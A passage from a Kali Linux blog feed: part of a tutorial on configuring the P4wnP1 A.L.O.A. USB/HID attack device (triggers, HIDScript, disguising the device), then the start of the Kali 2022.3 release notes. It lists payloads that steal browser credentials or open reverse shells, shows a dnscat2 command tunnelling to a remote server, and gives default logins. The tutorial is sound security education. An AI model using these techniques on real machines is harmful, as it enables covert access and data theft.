href="http://www.linux-usb.org/usb-ids.html">The USB ID Repository</a>, which is a large database of known values used for USB devices.</em></p> <p><p> <a href='https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-default.png'> <img src="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-default.png" alt="" /> </a> </p> </p> <h4 id="wi-fi-settings">Wi-Fi Settings</h4> <p>The Wi-Fi settings allows you <strong>change the Wi-Fi SSID network name</strong>, <strong>password</strong> (aka Pre Shared Key, PSK) as well as the <strong>channel</strong> which is being used. By altering these values, you can start to blend into the background by being less distinctive <em>(and more secure by not using default credentials)</em>!</p> <p>To apply the settings, you will click on the &ldquo;Deploy&rdquo; button. Keep in mind, when you change the settings and hit &ldquo;Deploy&rdquo; you will be disconnected and need to reconnect with your new settings.</p> <p><p> <a href='https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-wifi-settings.png'> <img src="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-wifi-settings.png" alt="" /> </a> </p> </p> <p>The default Wi-Fi mode is <strong>Access Point (AP)</strong>, which allows for other devices to connect to P4wnP1&rsquo;s wireless network.</p> <p>Alternatively, you can also set the P4wnP1 to be a <strong>client</strong> (client mode) on the network, instead of a AP. Using the pre-defined configurations, P4wnP1 will then connect to the network and behave like another device on the network.</p> <p>The final option, <strong>Client with Fallover to AP</strong>, gives you the &ldquo;best of both worlds&rdquo; as P4wnP1 will attempt to connect as a client, and if that fails, then switch to being a Access Point. Neat!</p> <p>For example, we will set it up in this fall over mode. So if the <code>kali Wi-Fi network</code> is in range and has the correct key, it should connect to that as a client, if not, if we are not in range, or it cannot see it, it will start up the access point <code>network</code>.</p> <p><p> <a href='https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-wifi-client-with-failover-ap.png'> <img src="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-wifi-client-with-failover-ap.png" alt="" /> </a> </p> </p> <p>If the airwaves are being monitored, you can simply disable the Wi-Fi network as well.</p> <h4 id="bluetooth">Bluetooth</h4> <p>Moving on, we have the Bluetooth settings.</p> <p>In this section, we can enable or disable Bluetooth. If <strong>discoverable</strong>, we can set the <strong>Bluetooth name</strong>, (with the default being <code>P4wnP1</code>). We can also set the <strong>Bluetooth PIN</strong> used to connect (the default PIN is <code>1337</code>) - PIN is only used if &ldquo;Secure Simple Pairing (SSP)&rdquo; is turned off.</p> <p><p> <a href='https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-bluetooth.png'> <img src="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-bluetooth.png" alt="" /> </a> </p> </p> <hr> <p>For the Bluetooth network settings, the <strong>P</strong>ersonal <strong>A</strong>rea <strong>N</strong>etwork profile (PAN) is used. Keep in mind that you typically have a range of 10 meters (33 ft) with Bluetooth connections.</p> <p>Some quick definitions for people who may not be familiar with Bluetooth Personal Area Network profiles:</p> <table> <thead> <tr> <th>Profile</th> <th>Definition</th> </tr> </thead> <tbody> <tr> <td>PANU</td> <td>Peer-to-Peer connection (one to one)</td> </tr> <tr> <td>PAN-GN</td> <td>Group Ad-hoc Network (GN) of up to 8 devices</td> </tr> <tr> <td>PAN-NAP</td> <td>Network Aggregation Point (NAP) can bridge the Bluetooth connection to the wireless connection</td> </tr> </tbody> </table> <p>So if you set the P4wnP1 to be in PAN-NAP (the default), you can connect up to 10 devices to the P4wnP1 over Bluetooth and share its network connection that way.</p> <p>If you were to set it up with PAN-GN, then up to 7 additional devices could connect to the P4wnP1, and can communicate with each other but there is no Internet access.</p> <p>And if you were to use PANU, then you can only transfer data between the device connected to the P4wnP1 and the P4wnP1 itself.</p> <h4 id="network-settings">Network Settings</h4> <p>The next tab is Network Settings, where we can change the options for the <strong>different ways of connecting to the P4wnP1</strong>.</p> <p>You can connect via <strong>Bluetooth (bteth)</strong>, <strong>USB (usbeth)</strong>, or as we currently are, via <strong>Wi-Fi (wlan0)</strong>.</p> <p>To make any changes, you select the interface, and make the change for that interface, including using <strong>DHCP</strong> or setting <strong>static IP</strong> values. You can also alter some DHCP options here. Under the hood, <a href="https://manpages.debian.org/testing/dnsmasq-base/dnsmasq.8.en.html">dnsmasq</a> is being used.</p> <p>For example, you may wish to have Wi-Fi set to client mode, using the network DHCP server and have Bluetooth enabled as a fallback interface, which is running a DHCP server.</p> <p><p> <a href='https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-network-settings.png'> <img src="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-network-settings.png" alt="" /> </a> </p> </p> <h4 id="trigger-actions">Trigger Actions</h4> <p>Now we have triggers.</p> <p>Triggers are the main way of doing things with the P4wnP1, when certain conditions are met. You can <strong>think of a trigger action as a payload</strong>. Whatever you set up here, <strong>if the conditions are met, the actions you set happen</strong>.</p> <p><p> <a href='https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-trigger-actions.png'> <img src="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-trigger-actions.png" alt="" /> </a> </p> </p> <hr> <p>Triggers are very powerful, and the sky is the limit when creating them. To get your feet wet, some trigger actions are:</p> <ul> <li>Service started - <em>Do something when a service has started on the P4wnP1</em></li> <li>USB gadget connected to host - <em>Do something when the P4wnP1 is connected to a host</em></li> <li>USB gadget disconnected from host - <em>Do something when the P4wnP1 is disconnected from a host</em></li> <li>Wi-Fi Access Point is up - <em>Do something when the P4wnP1&rsquo;s access point is up</em></li> <li>Joined existing Wi-Fi - <em>Do something when the P4wnP1 joins a Wi-Fi network as a client</em></li> <li>DHCP lease issued - <em>Do something when a DHCP lease is issued to a device connected to the P4wnP1</em></li> <li>Input on GPIO - <em>Do something based on the Raspberry Pi GPIO pins input</em></li> <li>SSH user login - <em>Do something when a user logs in to the P4wnP1 via SSH</em></li> </ul> <p>If you want to dig a little deeper <em>(and keep your workflow simpler with meaningful naming values)</em>, you can use <strong>group channels</strong>. As the name suggests, you can group actions together. This then allows for easier to read rules, as well as more complex logic. These options are:</p> <ul> <li>A value on a group channel - <em>Do something when a specific value on a group channel matches</em></li> <li>Multiple values on a group channel - <em>Do something once multiple values on a group channel match</em></li> </ul> <p>Example scenario of this could have the end result to &ldquo;run a bash script on the P4wnP1&rdquo;, but the conditions for this to happen is when &ldquo;Wi-Fi Access Point is up&rdquo; as well as &ldquo;USB gadget connected to host&rdquo; are both met. So you create a few triggers:</p> <ul> <li>On &ldquo;Wi-Fi Access Point is up&rdquo; -&gt; send value &ldquo;1&rdquo; to group &ldquo;connected&rdquo;</li> <li>On &ldquo;USB gadget connected to host&rdquo; -&gt; send value &ldquo;2&rdquo; to group &ldquo;connected&rdquo;</li> </ul> <p>We can go even more complex logic with the rules with making the third trigger. We can control the ordering using &ldquo;exact ordered sequence&rdquo;. So does it matter if the device is plugged in before the Wi-Fi access point is up? By using:</p> <ul> <li><code>type &quot;All (logical AND)&quot;</code> the <strong>ordering does not matter</strong> in order to do the action</li> <li><code>exact ordered sequence</code> the <strong>order matters</strong> in order to trigger the action</li> </ul> <p>With what we have in mind, we do not require a certain sequence of events so we use <code>multiple values on group channel&quot;; values (1,2); type &quot;All (logical AND)&quot; -&gt; Start bash script</code>.</p> <p>Something else to keep in mind when coming up with ideas, you can enable &ldquo;one shot&rdquo; mode, which will only trigger once, rather than every time the event happens. Handy if the P4wnP1 is disguised as another device, it can then behave &ldquo;normally&rdquo; after running the payload the first time.</p> <h4 id="hidscript">HIDScript</h4> <p>Moving on to the HIDScript tab, if you have ever used <a href="https://github.com/hak5/usbrubberducky-payloads">DuckyScript</a>, HIDscripts are similar, but based upon JavaScript rather than bash.</p> <p>&ldquo;HIDScripts&rdquo; run on Raspberry Pi device and they interact with the enumerated &ldquo;fake&rdquo; hardware which is connected externally, however &ldquo;bash scripts&rdquo; run on the Raspberry Pi OS &ldquo;internal&rdquo;.</p> <p>To get you started, P4wnP1 pre-populates with a simple HIDScript (called <code>hidtest1.js</code>) that will launch notepad on a Windows computer, types out a phrase, then moves the mouse, and then repeats it without any delays. More about this can be found in our <a href="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/#creating-our-own-trigger">example trigger</a>.</p> <p><p> <a href='https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-hidscript.png'> <img src="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-hidscript.png" alt="" /> </a> </p> </p> <hr> <p>In the <a href="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/#other-resources">Other Resources</a> at the end of this post you can find additional payloads that people have written, if you want, or need, some inspiration, such as:</p> <ul> <li>Extract Chrome and Internet Explorer credentials as well as any stored Wi-Fi networks information, and copy them to the P4wnP1</li> <li>Open a webpage</li> <li>Run an command as administrator on the target system the P4wnP1 is plugged in to</li> <li>Using just PowerShell commands, create a reverse shell with administrator rights</li> </ul> <p>To help create and debug HIDscripts, you can click the <code>RUN</code> button at any time to execute, rather than having do the events of a trigger action.</p> <h4 id="event-log">Event Log</h4> <p>The Event Log tab is where events are logged, if you have set up any triggers to log.</p> <p>The Event Log is <em>only</em> for P4wnP1 A.L.O.A. events, and does not include logs on the system itself.</p> <p>This is useful for debugging any payloads and triggers you are writing, tracking process of actions, and retrieving contents of payloads,</p> <p><p> <a href='https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-eventlog.png'> <img src="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-eventlog.png" alt="" /> </a> </p> </p> <h4 id="generic-settings">Generic Settings</h4> <p>And finally we have our Generic Settings, where we can do things like use the <strong>Master Template Editor</strong> to control what the defaults are every time it boots as well as <strong>Reboot</strong> or <strong>Shutdown</strong> the P4wnP1 device, and also make a <strong>backup</strong> or <strong>restore</strong> the P4wnP1 database (so your settings and hard work is preserved).</p> <p><p> <a href='https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-generic-settings.png'> <img src="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-generic-settings.png" alt="" /> </a> </p> </p> <h2 id="creating-our-own-trigger">Creating our own Trigger</h2> <p>Now that we have covered using the web interface of the P4wnP1 A.L.O.A., let&rsquo;s put the information we have gained into practice. As an example, lets set the P4wnP1 up so that when we:</p> <p><strong>Plug the P4wnP1 into a Windows machine</strong> while <strong>in USB gadget mode</strong>, <strong>it will run the default <a href="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/#hidscript">HIDScript</a> <code>hidtest1.js</code></strong> to run a command and move the mouse about.</p> <p>First, let&rsquo;s go into the web interface and click on trigger actions:</p> <p><p> <a href='https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-trigger-actions.png'> <img src="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-trigger-actions.png" alt="" /> </a> </p> </p> <hr> <p>Then we will click on <strong>Add One</strong>, which brings up the following modal window and in order to change any settings, <strong>it has to be enabled</strong>, so we will quickly do that too:</p> <p><p> <a href='https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-trigger-enabled.png'> <img src="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-trigger-enabled.png" alt="" /> </a> </p> </p> <hr> <p>In this case, we will choose: <code>USB gadget connected to host</code>:</p> <p><p> <a href='https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-trigger-add-usb-gadget-connected-to-host.png'> <img src="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-trigger-add-usb-gadget-connected-to-host.png" alt="" /> </a> </p> </p> <hr> <p>Now we select the action to take, which is &ldquo;Start a <a href="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/#hidscript">HIDScript</a>&rdquo;:</p> <p><p> <a href='https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-trigger-add-action-start-HID.png'> <img src="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-trigger-add-action-start-HID.png" alt="" /> </a> </p> </p> <hr> <p>Now we choose which <a href="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/#hidscript">HIDScript</a> to load. For this example we will load the default HIDscript that is written, called <code>hidtest1.js</code>, which will launch notepad, type out &ldquo;Hello from P4wnP1 run&rdquo; and then move the mouse to the right, then left, and then it will do it again, but much faster, to show the speed at which the P4wnP1 can run them.</p> <p><em>Any HIDScripts that you write, or get from the community, will show up in this list once they are added to your P4wnP1. The list below are just the default ones that come with the P4wnP1.</em></p> <p><p> <a href='https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-trigger-add-hid-select-hidtest.png'> <img src="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-trigger-add-hid-select-hidtest.png" alt="" /> </a> </p> </p> <hr> <p>Lastly, to save our trigger, we click the <code>Update</code> button:</p> <p><p> <a href='https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-trigger-add-hid-update.png'> <img src="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-trigger-add-hid-update.png" alt="" /> </a> </p> </p> <p>Happy hacking!</p> <h2 id="installing-a-package-when-connected-over-ssh">Installing A Package When Connected over SSH</h2> <p>When you have Internet access on the P4wnP1, you have the full arsenal of Kali&rsquo;s repositories available to you. So any package you can install in Kali on a Raspberry Pi Zero W will be available for use in bash scripts you may write. You can access those scripts via <a href="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/#trigger-actions">triggers</a>.</p> <p>However you are connected to P4wnP1, you can SSH in using either the <code>kali</code> and <code>root</code> users. The <a href="https://www.kali.org/docs/introduction/default-credentials/">default credentials</a> are:</p> <ul> <li><code>kali</code> / <code>kali</code></li> <li><code>root</code> / <code>toor</code></li> </ul> <p>We are now going to install the package <a href="https://www.kali.org/tools/dnscat2/">dnscat2-client</a> on P4wnP1, then connect to a <a href="https://www.kali.org/tools/dnscat2/#dnscat2-server">dnscat2-server</a> we have already set up somewhere else.</p> <p>As a reminder, we always want to run <code>sudo apt update</code> before installing packages, to ensure we get the latest version:</p> <pre><code class="language-console">kali@kali-raspberry-pi-zero-w-p4wnp1-aloa:~$ sudo apt update [...] kali@kali-raspberry-pi-zero-w-p4wnp1-aloa:~$ kali@kali-raspberry-pi-zero-w-p4wnp1-aloa:~$ sudo apt -y install dnscat2-client Reading package lists... Done Building dependency tree... Done Reading state information... Done Suggested packages: dnscat2-server The following NEW packages will be installed: dnscat2-client 0 upgraded, 1 newly installed, 0 to remove and 0 not upgraded. [...] </code></pre> <p>Now, we can just simply run the suggested command when setting up <code>dnscat2-server</code> on our other machine:</p> <pre><code class="language-console">kali@kali-raspberry-pi-zero-w-p4wnp1-aloa:~$ dnscat --dns server=10.0.13.37,port=53 --secret=5672ddb107fe2f33e490a83e8d1036ca Creating DNS driver: domain = (null) host = 0.0.0.0 port = 53 type = TXT,CNAME,MX server = 10.0.13.37 ** Peer verified with pre-shared secret! Session established! </code></pre> <p>Happy hacking (again)!</p> <h2 id="credits">Credits</h2> <p>The <a href="https://p4wnp1.readthedocs.io/">original</a> author of P4wnP1 A.L.O.A. is <a href="https://twitter.com/mame82">Marcus Mengs aka MaMe82</a>.</p> <p><a href="https://github.com/rogandawes">Rogan Dawes</a> took over maintainership when Marcus needed to step away.</p> <h2 id="reminder">Reminder</h2> <p>We love seeing what the community builds on top of Kali Linux, if you are working on a project let us know!</p> <p>You can reach out to us on <a href="https://twitter.com/kalilinux">Twitter</a> or on our <a href="https://discord.kali.org/">Discord</a>.</p> <h2 id="other-resources">Other Resources</h2> <p><strong>Project Resources</strong>:</p> <ul> <li><a href="https://github.com/RoganDawes/P4wnP1_aloa">P4wnP1 A.L.O.A. Homepage</a></li> <li><a href="https://twitter.com/P4wnP1">P4wnP1 Twitter</a></li> </ul> <p><strong>Kali Resources</strong>:</p> <ul> <li><a href="https://www.kali.org/docs/arm/raspberry-pi-zero-w-p4wnp1-aloa/">Kali Linux P4wnP1 A.L.O.A. Documentation</a></li> </ul> <p><strong>Community Resources</strong>:</p> <ul> <li><a href="https://thingiverse.com/thing:2701424">A Case for P4wnP1 with a spot for an OLED screen</a></li> <li><a href="https://github.com/FuocomanSap/P4wnp1-ALOA-Menu-Reworked">A Menu to use with an OLED screen on the P4wnP1 A.L.O.A</a></li> <li><a href="https://github.com/beboxos/P4wnP1-ALOA-HID-payloads">Additional Payloads for P4wnP1 A.L.O.A.</a></li> <li><a href="https://levelup.gitconnected.com/hacking-with-the-raspberry-pi-zero-w-8520a4d72b2e">Hacking with the Raspberry Pi Zero W</a></li> <li><a href="https://jamesachambers.com/kali-linux-p4wnp1-aloa-guide-setup-usage-examples">Kali Linux P4wnP1 A.L.O.A. Guide  Setup / Usage / Examples</a></li> <li><a href="https://medium.com/azkrath/p4wnp1-a-l-o-a-an-advanced-hid-attack-device-d906ae5bf48c">P4wnP1 A.L.O.A. An advanced HID attack device</a></li> <li><a href="https://tenaka.net/p4wnp1-hid-attack">Pi Zero as a HID \ USB Device (P4wnP1 A.L.A.O)</a></li> <li><a href="https://youtube.com/watch?v=s0K-YIL_G5c">Video about using an OLED screen with the P4wnP1 A.L.O.A</a></li> <li><a href="https://github.com/federicodotta/LetMeHID">Windows HID payload generator</a></li> </ul></description>
</item>
<item>
<title>Kali Linux 2022.3 Release (Discord & Test Lab)</title>
<link>https://www.kali.org/blog/kali-linux-2022-3-release/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-linux-2022-3-release/</guid>
<pubDate>Tue, 09 Aug 2022 00:00:00 +0000</pubDate>
<enclosure url="https://www.kali.org/blog/kali-linux-2022-3-release/images/banner-2022.3-release.jpg" type="image/jpg"/>
<description><p>In light of &ldquo;Hacker Summer Camp 2022&rdquo; <em>(BlackHat USA, BSides LV, and DEFCON)</em> occurring right now, we wanted to push out Kali Linux 2022.3 as a nice surprise for everyone to enjoy! With the publishing of this blog post, we have the download links ready for immediate <a href="https://www.kali.org/get-kali/">access</a>, or you can <a href="https://www.kali.org/docs/general-use/updating-kali/">update any existing installation</a>.</p> <p>The highlights for Kali&rsquo;s 2022.3&rsquo;s release:</p> <ul> <li><strong><a href="https://www.kali.org/blog/kali-linux-2022-3-release/#kali-is-on-discord">Discord Server</a></strong> - Kali&rsquo;s new community real-time chat option has launched!</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2022-3-release/#test-lab-environment">Test Lab Environment</a></strong> - Quickly create a test bed to learn, practice, and benchmark tools and compare their results</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2022-3-release/#kali-tools-documentation">Opening Kali-Tools Repo</a></strong> - We have opened up the Kali tools repository &amp; are accepting your submissions!</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2022-3-release/#help-wanted">Help Wanted</a></strong> - We are looking for a Go developer to help us on an open-source project</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2022-3-release/#kali-nethunter-updates">Kali NetHunter Updates</a></strong> - New releases in our NetHunter store</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2022-3-release/#kali-for-virtual-machines">Virtual Machines Updates</a></strong> - New VirtualBox image format, weekly images, and build-scripts to build your own</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2022-3-release/#new-tools-in-kali">New Tools In Kali</a></strong> - Would not be a release without some new tools!</li> </ul> <p><em>For more details, see the <a href="https://bugs.kali.org/changelog_page.php">bug tracker changelog</a>.</em></p> <hr> <h2 id="kali-is-on-discord">Kali is on Discord</h2> <p>We have started up a new discord server, <strong><a href="https://discord.kali.org/">Kali Linux &amp; Friends</a></strong>. This is our new place for the Kali community to get together and chat in real-time all about Kali Linux (as well as other <a href="https://www.offsec.com/community-projects/">community projects</a> that OffSec has to offer).</p> <p>This is a community server, all with common interests. We do not have the goal to get as many users as possible, instead, we are growing a place for each other to help one another. We are <strong>focusing on quality not quantity</strong>. Please bear in mind, if you are looking for help, first search for your problem, ask questions, then wait for the community support from your peers. Remember no one is under obligation to help you, and you are more likely to get assistance if you are polite and show you have put some effort into solving your own issue.</p> <p>Speaking of &ldquo;real-time chatting&rdquo;, we are going to be <strong>starting a new tradition</strong>. We will be doing an hour long session <strong>after every Kali release</strong> where various Kali developers will come and voice chat on Discord, answer questions about Kali and its direction, take your input, and so on. <em>We will be sure to add details about this in every blog post release going forwards.</em></p> <p>The first one is on <strong>Tuesday, 16th August 2022 16:00 -&gt; 17:00 <a href="https://time.is/UTC">UTC/+0 GMT</a></strong>.</p> <p>Feel free to be a fly on the wall, come by to say a hello, or ask questions! This is a great opportunity to ask questions, provide your input on what can help improve Kali, or get involved and contribute!</p> <p><em>Please note, we will not be recording these sessions. These are live sessions only.</em></p> <hr> <p><strong>Why Discord?</strong> In short, people are already there. It&rsquo;s a common and popular platform that has become very popular over the years. People have already gone through the process of signing up and becoming familiar with the UI. For those who are not, you can register and within minutes be chatting. It&rsquo;s simple and straight forward to get going.</p> <p>Real-time chat can be seen like a social network, as it&rsquo;s only as good as the people who are on it.</p> <p><strong>Why not use Matrix?</strong> In short, same reasons as above, the user-base. Going into a bit more depth, the entry barrier is higher. It&rsquo;s a bit more complex to get setup and it&rsquo;s not as user-friendly.</p> <p>Matrix is great (and various team members do use it daily)! <a href="https://www.kali.org/docs/policy/kali-linux-open-source-policy/">Kali being open-source</a>, using open-source solutions to match does make sense. But we are not trying to be a trend setter - we are going with the crowd. We believe the key to a successful community is the community itself. We are not wanting to reinvent the wheel, we are not wanting people to sign up once again to another service, using another chat application, another thing that&rsquo;s giving you notifications. If people are already there, we are going with them.</p> <p>Lastly, we do not want to be focusing on running and maintaining infrastructure of a self-hosted solution for a real-time chat, as that takes us away from developing an OS with everything that goes with it.</p> <p><strong>What happened to IRC?</strong> In short, it&rsquo;s still there. We are still using it from a Kali development perspective. The network may have changed (from Freenode to Libera Chat), but <a href="https://www.kali.org/docs/community/kali-linux-irc-channel/">we still do use Internet Relay Chat</a>.</p> <p>Back in the heyday of Freenode, it was the place to be. &ldquo;Everyone&rdquo; was on it. It did slowly start to lose some users, before the crash in 2021. Libera Chat stepped it, and did recover some of the broken pieces but various homes moved on to other networks or even protocols.</p> <p>The IRC channels are public, so anyone can join in on the development side of things. However the Kali community focus will be on Discord.</p> <h2 id="test-lab-environment">Test Lab Environment</h2> <blockquote> <p>&ldquo;A craftsman is only as good as their tools.&rdquo;</p> </blockquote> <p>This is true, even outside of Information Security field, <strong>you need to <em>understand</em> your tools</strong> to master your craft. You can read their code to understand how they work (or a very detailed REAME at times), help screens and their manuals (if they have one) will give you a starting point on how to use them. But where do you use them especially when they are security tools? What output should the tool give? What is a successful run? How long does the tool take? What is its baseline? How can I get experience with it? All valid questions which need answers.</p> <p>To try and achieve these answers, most seasoned professionals will practice first <em>(hopefully in a known, controlled environment!)</em>. This is where a &ldquo;Test Bed/Laboratory&rdquo; comes into play. Theory is different to practical <em>(You may remember this the first time you were tasked of something new to accomplish)</em>. You can take the static theory-based output from help screens, READMEs, and manual pages and hands-on enter the data into programs and monitor the dynamic output and practical response. Its one thing to read something, its another to do it. The result often gives people a deeper understanding.</p> <p>Practice makes ~perfect~ permanent. So practice, practice, practice! Inquisitive minds can then start to experiment with new configurations, options, commands and flags. Then start to chain items together, or compare similar and alternative solutions, then compare the results, to become more educated and build up a benchmark of knowledge. This grows experience.</p> <p>We are trying to make it a bit easier to build up your test lab. So we have packaged up:</p> <ul> <li><a href="https://www.kali.org/tools/dvwa/">DVWA</a> - Damn Vulnerable Web Application</li> <li><a href="https://www.kali.org/tools/juice-shop/">Juice Shop</a> - OWASP Juice Shop</li> </ul> <p>All you have to do is <code>apt install &lt;package&gt;</code>, else you can use the <code>kali-linux-labs</code> <a href="https://www.kali.org/docs/general-use/metapackages/">metapackage</a> to get them all! <em>This list will be growing in the upcoming Kali releases!</em></p> <div class="notices info"> <p data-header="Info"> At times, you may be running codes that are designed to be vulnerable. Please take the necessary steps to secure your environment. </p> </div> <p><em>Practice tools, sharpen skills, and benchmark alternatives</em></p> <hr> <p>If you put all your trust into something without understanding it, there could be complications&hellip;</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2022-3-release/images/tape_messure.jpg'> <img src="https://www.kali.org/blog/kali-linux-2022-3-release/images/tape_messure.jpg" alt="" /> </a> </p> <em>Credit: unknown!</em></p> <h2 id="kali-for-virtual-machines">Kali for Virtual Machines</h2> <p>We have already provided Kali Linux images for <a href="https://www.kali.org/docs/virtualization/install-vmware-guest-vm/">VMware</a> and <a href="https://www.kali.org/docs/virtualization/install-virtualbox-guest-vm/">VirtualBox</a> since the <a href="https://www.kali.org/releases/">start</a>. For this release, there&rsquo;s been a few changes worth noting.</p> <p><strong>We now distribute the VirtualBox image as a VDI disk and a <code>.vbox</code> metadata file</strong>, or to say it short: the native format for VirtualBox images. It should be a bit faster to download, as those images have a better compression ratio compared to the OVA images that we used to provide. It should also be a bit more straightforward to use it, you just need to unpack the image in your VirtualBox folder and run it. In case you need help, refer to our documentation: <a href="https://www.kali.org/docs/virtualization/import-premade-virtualbox/">Import Pre-Made Kali VirtualBox VM</a>.</p> <p>Additionally, we just started to provide <a href="https://www.kali.org/get-kali/#kali-virtual-machines">weekly builds of our VM images</a>. These images are built from the <a href="https://www.kali.org/docs/general-use/kali-branches/">kali-rolling branch</a>, meaning that they have the most up-to-date packages, but on the other hand they don&rsquo;t receive as much testing as our quarterly releases.</p> <p>Last but not least, the scripts that we use to build those images are now available <a href="https://gitlab.com/kalilinux/build-scripts/kali-vm">on GitLab</a>. If you need to build custom Kali VM images, this is the place to go!</p> <h2 id="help-wanted">Help Wanted</h2> <p>Do you know <strong>Go</strong>? The Kali team is looking for some help! <em>Bonus points if you know <strong>Redis</strong> as well!</em></p> <p>This work would be going into an already existing Open-Source project, <a href="https://github.com/etix/mirrorbits">MirrorBits</a>. We have a few desirable features we would love to be added into it.</p> <p>Interested? Let&rsquo;s talk. Please get in touch by emailing <code>icanhelp at kali dot org</code>, or <a href="https://twitter.com/kalilinux">tweeting at us directly</a>. If you have any previous work to showcase, even better.</p> <p>Why are you guys not doing it? Our development team has a maxed out roadmap and we don&rsquo;t want to be waiting until items are closed out before this goes into production.</p> <h2 id="other-kali-updates">Other Kali updates</h2> <ul> <li>For people who use Xrdp (like <a href="https://www.kali.org/docs/wsl/win-kex/">Win-KeX</a>), there is a new look to the login</li> <li>We have fixed up some confusion between fuse and fuse3</li> <li>We did some maintenance to our network repository, and shrank <code>/kali</code> from 1.7Tb to 520Gb!</li> </ul> <h2 id="new-tools-in-kali">New Tools in Kali</h2> <p>It would not be a Kali release if there were not any new tools added! A quick run down of what has been added <em>(to the network repositories)</em>:</p> <ul> <li><a href="https://www.kali.org/tools/defectdojo/">DefectDojo</a> - Open-source application vulnerability correlation and security orchestration tool</li> <li><a href="https://www.kali.org/tools/shellfire/">shellfire</a> - Exploiting LFI/RFI and command injection vulnerabilities</li> <li><a href="https://www.kali.org/tools/sprayingtoolkit/">SprayingToolkit</a> - Password spraying attacks against Lync/S4B, OWA and O365</li> </ul> <p><em>There have been numerous packages updates as well.</em></p> <h2 id="kali-nethunter-updates">Kali NetHunter Updates</h2> <p>Full Android 12 support is getting closer to being a reality with 6 new kernels in our <a href="https://gitlab.com/kalilinux/nethunter/build-scripts/">NetHunter repository</a> and updates to the <a href="https://store.nethunter.com/en/packages/com.offsec.nethunter/">NetHunter app</a>. It is still not for the fainthearted as a little tinkering is required to install all the components individually but we&rsquo;re getting closer to releasing the first OnePlus image soon.</p> <p>For the meantime, we have updated the apps in our <a href="https://store.nethunter.com/">NetHunter Store</a> to the latest releases, including:</p> <ul> <li>aRDP, aSPICE, bVNC, Opaque = v5.1.0</li> <li>Connectbot = 1.9.8-oss</li> <li>Intercepter-NG = 2.8</li> <li>OONI Probe = 3.7.0</li> <li>OpenVPN = 0.7.38</li> <li>Orbot = 16.4.1-RC-2-tor.0.4.4.6</li> <li>SnoopSnitch = 2.0.12-nbc</li> <li>Termux = 118</li> <li>Termux-API = 51</li> <li>Termux-Styling = 29</li> <li>Termux-Tasker = 6</li> <li>Termux-Widget = 13</li> <li>Termux-Float = 15</li> <li>WiGLE WiFi Wardriving = 2.64</li> </ul> <p>If you would like to get involved and help out with the development, or just like to chat to like-minded Android tinkerers, why don&rsquo;t you join us in the NetHunter channels on our <a href="https://discord.kali.org/">new Discord server</a>? We&rsquo;d love to see you around!</p> <h2 id="kali-arm-updates">Kali ARM Updates</h2> <ul> <li>All Raspberry Pi devices have had their kernel upgraded to 5.15.</li> <li>Created <a href="https://arm.kali.org/">arm.kali.org</a> to have a overview and statistics for <a href="https://gitlab.com/kalilinux/build-scripts/kali-arm">kali-arm</a> <em>(very similar to <a href="https://nethunter.kali.org/">nethunter.kali.org</a>)</em>.</li> <li>Every Kali ARM device has had their default size for the boot partition set to 256 MB.</li> <li><a href="https://www.kali.org/docs/arm/pinebook/">Pinebook</a> has had the broken sleep modes removed, so it should no longer go to sleep and be unable to wake up.</li> <li><a href="https://www.kali.org/docs/arm/usb-armory-mkii/">USBArmory MKII</a> moved to the 